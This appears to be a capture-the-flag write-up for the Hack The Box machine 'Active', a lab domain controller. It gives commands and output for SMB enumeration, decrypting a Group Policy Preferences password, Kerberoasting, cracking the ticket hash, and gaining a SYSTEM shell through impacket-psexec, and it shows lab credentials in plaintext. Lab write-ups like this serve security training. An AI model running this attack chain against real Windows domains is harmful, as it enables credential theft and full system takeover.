# Active-HTB

Nmap report;
````
└─$ cat nmap_report.txt 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-01 15:06 -0300
Nmap scan report for active.htb (10.129.63.188)
Host is up (0.41s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-01 18:04:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (96%), Microsoft Windows 7 (96%), Microsoft Windows Vista SP1 (95%), Microsoft Windows Server 2008 SP1 (95%), Microsoft Windows Server 2008 SP2 or Windows 10 or Xbox One (95%), Microsoft Windows Vista SP0 - SP2, Windows Server 2008, or Windows 7 Ultimate (95%), Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 SP2 (94%), Microsoft Windows Vista SP2 (94%), Microsoft Windows 7 or Windows Server 2008 R2 or Windows 8.1 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-01T18:05:58
|_  start_date: 2026-09-01T17:50:23
|_clock-skew: -1m23s

TRACEROUTE (using port 88/tcp)
HOP RTT       ADDRESS
1   298.55 ms 10.10.16.1
2   472.07 ms active.htb (10.129.63.188)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.93 seconds
````

As always, nmap gives us very usefull information. On port 88 we become aware that we are interacting with a domain server running Windows Server 2008 R2 SP1. Port 389 is running ldap (Lightweight Directory Access Protocol) and the domain name is active.htb. Ldap's common use is a safe place to store usernames and passwords. Also port 445 has a microsoft service called "microsoft-ds" which is commonly associated with SMB via TCP. Let's try to ennumerate SBM. First let's go for smbmap:
````
smbmap -H active.htb
````

The mounted shares are;
````
└─$ smbmap -H active.htb

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.63.188:445       Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
````

But we only have access to Replication. Let's check it but deeper:
````
smbmap -r Replication -H 10.129.63.188 --depth 20
````
This is going to automate the ennumeration of the "Replication" directory:
````
smbmap -r Replication -H 10.129.63.188 --depth 20

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.63.188:445       Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        ./Replication
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    active.htb
        ./Replication//active.htb
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    DfsrPrivate
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Policies
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    scripts
        ./Replication//active.htb/DfsrPrivate
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ConflictAndDeleted
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Deleted
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Installing
        ./Replication//active.htb/Policies
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        fr--r--r--               23 Sat Jul 21 07:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Group Policy
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    USER
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        fr--r--r--              119 Sat Jul 21 07:38:11 2018    GPE.INI
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Microsoft
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Preferences
        fr--r--r--             2788 Sat Jul 21 07:38:11 2018    Registry.pol
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Windows NT
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    SecEdit
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        fr--r--r--             1098 Sat Jul 21 07:38:11 2018    GptTmpl.inf
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Groups
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        fr--r--r--              533 Sat Jul 21 07:38:11 2018    Groups.xml
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        fr--r--r--               22 Sat Jul 21 07:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    USER
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Microsoft
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Windows NT
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    SecEdit
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        fr--r--r--             3722 Sat Jul 21 07:38:11 2018    GptTmpl.inf
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
[*] Closed 1 connections
````

The interesting thing here is thsi;
````
        fr--r--r--              533 Sat Jul 21 07:38:11 2018    Groups.xml
````
groups.xml is a group policy file containing credentials readable by anyone in a reversible format. Download it with the follwinc command:
````
smbmap -r Replication -H 10.129.63.188 --depth 20 -A Groups.xml -q
````
Bingo:

<img width="1875" height="47" alt="image" src="https://github.com/user-attachments/assets/441771dd-acce-4174-8463-405f4886928d" />

Credentials stored inside Groups.xml are encryped via Windows Group Policy Preferences (GPP). There is a tools made for reversing this:
````
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
````
Now that we have credentials, let's see what else we can access with smbmap:
````
└─$ smbmap -H 10.129.63.188 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.63.188:445       Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
````

The users directory is wide open. Let's access it via smbclient:
````
smbclient //10.129.63.188/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
````
Go to svc_tgs desktop and get user.txt:
````
smbclient //10.129.63.188/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
````
Now we go to Privescalation.

We are going to do some kerberoasting. First use getusersspn from impacket to list service usernames that are associated with normal user accounts:
````
impacket-GetUserSPNs -request -dc-ip 10.129.64.30 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
````
````
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 16:06:40.351723  2026-09-02 15:30:01.460563             



[-] CCache file is not found. Skipping...
````
It also got us the hash:
````
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e9807a2c8de983ed787828bfc473d839$db0aaeaaa9421c9f6424123f6bde3aa8b4d30f14e61042281a107547d53bef0ac86d594a15d58d7df82c1c14b008b289910898a881a163401e8e10ec5f3ef5bcf081024be1b9d90672802628fa714030cf5fe73670f112132a96dc78c3839c07cfad8805ed6d65dfec29a392e3cbcbe064ec9d3e90c9b8a13e61b5b673a80bbe206adb591724efe942fb6a88c2451b04786eb08ed63a3552d0972200b9566c960a3d5d5071637ced038d9191d4e76fd136d2dff57fcb5044669d514929e1d6174acfead0d6b3b57a1a19499a65f7902beca808c718d18f60c75eedf3e627be38ee0a33274f6d9e3cd6f38d9fe278eb44bfddd68ab1fe6feab51d122840082ec273420a1164395f3018eae3622cc5975acf5e808e34fe579478203c115719c6cabc3abefe0469205a9ba937d24040347ee9ff49e665bb55a2ce576b9989e780b56b6590ccbb9eb306ff7a0523bc8a28ad9eba728ca5e355c243004d397524dc00743d4f99138850149ef694d34d8a9e41e152481a9817fbbed659af2d0a06e2517ec832073983e077625724b766e43799476dda102557d98bed268146e4693d04776d42c91df41183ca3b3d9be63b1d55491422c328be924d9c06722b02dc408d6e1201705c73b111f9551dab20491a0956ea21cbd18b0d955782155d48c7565c6b1a1e6bf7fc29e08cc9f41b0f6072a8a0f5a48228f3b43b69a08d2803e764e07587e1a28e3e7b32c900e4d06eb2402107fa702f7c07944883e2296aa7904e89d4c2835206b1d71fe18b7c081cd632586dddc09f4bb84dfa5e5d60c568cabae41a8644a9dbcd65572f73dca01070c09f4f20c1d379b59905cb02fc469f01cd33582e6a3cf1b0ddfcf37e734322653321d56c8ccbb1efd1734e348f59b3fc27da00dbdda7d90736def598b7ddb7928655a898c1b7a721b351a29347c5dc6ad113f35632145e0cb03eb2611a0ef45ef228253e75ac72a963fed87373bb8d8067e517e07ef7c29444768e265c890be4862aa0b7b215462817801ffda9eed9dba7a59b742bb0fcd656eda29b2807f63fe0e092fe6e9b62a94959355b41b0b11df34f92a72473f6da95479e97711d3ec30f70d6ca15c155ee370d764bc1b84d8d39788b476ae726db1990a3e17aadebe0486b3f383471645dcc254dec6c60e2ca7acf8634bdad36137838197dbce586625b104fb0386565d6b92c2e492f6c042706752319233c1ebb30323de6960f709ec892f0c8bb73495b732fba61
````
The format of the hash is: krb5tgs. Let's pass it on to john so we ca crack it using rockyou:
````
└─# john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt GetUserSPNs.out
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:06 DONE (2026-09-02 15:52) 0.1626g/s 1713Kp/s 1713Kc/s 1713KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
````
Ticketmaster1968 is the administrator password.
Now we jsut need to get a shell using impacket:
````
└─# impacket-psexec active.htb/administrator@10.129.64.30
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.129.64.30.....
[*] Found writable share ADMIN$
[*] Uploading file dnQHUcNP.exe
[*] Opening SVCManager on 10.129.64.30.....
[*] Creating service ZVwo on 10.129.64.30.....
[*] Starting service ZVwo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
````

